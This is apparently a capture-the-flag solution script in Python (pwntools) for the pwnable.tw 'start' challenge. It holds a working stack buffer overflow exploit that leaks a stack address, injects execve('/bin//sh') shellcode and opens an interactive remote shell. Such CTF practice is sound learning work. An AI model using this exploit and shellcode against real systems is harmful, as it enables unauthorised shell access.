#since .kr was down the last days i had to play on another wargame platform

from pwn import *

def pwn():
    #r = process('./start')
    r = remote('chall.pwnable.tw', 10000)
    #raw_input('ATTACH TIME')
    payload   = '\x90'*20
    payload   += p32(0x08048087)
    r.recvuntil(':')
    r.send(payload)
    stack     = r.recv(4)
    stack     = u32(stack)
    log.success('Leaked stack ptr: '+hex(stack))
    payload2  = '\x90'*20
    payload2  += p32(stack+20)
    payload2  += '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'
    r.sendline(payload2)
    r.interactive()
pwn()
